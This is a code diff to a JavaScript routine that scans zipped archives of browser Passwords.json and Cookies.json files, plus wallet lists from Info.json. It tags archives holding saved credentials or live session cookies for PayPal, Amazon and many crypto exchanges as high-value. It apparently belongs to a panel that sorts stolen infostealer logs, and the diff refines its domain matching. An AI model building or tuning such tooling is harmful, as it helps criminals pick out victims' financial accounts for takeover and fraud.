@@ -54,22 +54,27 @@ function rowToJson(row) {
 
 const TAG_DOMAIN_RULES = [
   { tag: "paypal", needles: ["paypal.com", "paypalobjects.com"] },
-  { tag: "amazon", needles: ["amazon."] },
+  // "amazon." but never amazonaws (AWS infra hosts) — that was the false positive.
+  { tag: "amazon", needles: ["amazon."], exclude: ["amazonaws."] },
   {
     tag: "crypto-exchange",
     needles: ["binance.", "coinbase.", "kraken.", "bybit.", "okx.", "kucoin.", "crypto.com", "bitstamp.", "gemini.", "bitfinex.", "gate.io", "upbit.", "bitget.", "htx.", "mexc."],
   },
 ];
 
-/// Scan an assembled archive for high-value indicators: credential/cookie
-/// domains plus wallet/extension presence from Info.json.
+/// Scan an assembled archive for high-value indicators.
+/// PayPal/Amazon badges fire on saved credentials OR cookies for the domain.
+/// Exchange badges fire on either too (a live session is valuable on its own).
+/// Wallets come from Info.json lists.
 function computeTags(zipBuf, info) {
   const tags = new Set();
   try {
     const zip = parseZip(zipBuf);
     for (const entry of zip.entries) {
       const base = entry.path.split("/").pop();
-      if (base !== "Passwords.json" && base !== "Cookies.json") continue;
+      const isPasswords = base === "Passwords.json";
+      const isCookies = base === "Cookies.json";
+      if (!isPasswords && !isCookies) continue;
       if (entry.size > 32 * 1024 * 1024) continue;
       let rows;
       try {
@@ -82,7 +87,15 @@ function computeTags(zipBuf, info) {
         const host = String(row?.Hostname || row?.domain || "").toLowerCase();
         if (!host) continue;
         for (const rule of TAG_DOMAIN_RULES) {
-          if (rule.needles.some((n) => host.includes(n))) tags.add(rule.tag);
+          if (rule.exclude && rule.exclude.some((x) => host.includes(x))) continue;
+          if (!rule.needles.some((n) => host.includes(n))) continue;
+          if (rule.tag === "crypto-exchange") {
+            // Exchanges: saved creds OR a live session cookie both count.
+            tags.add(rule.tag);
+          } else if (isCookies || (isPasswords && row?.Password && String(row.Password).length > 0)) {
+            // PayPal/Amazon: saved login or any cookie for the domain.
+            tags.add(rule.tag);
+          }
         }
       }
     }
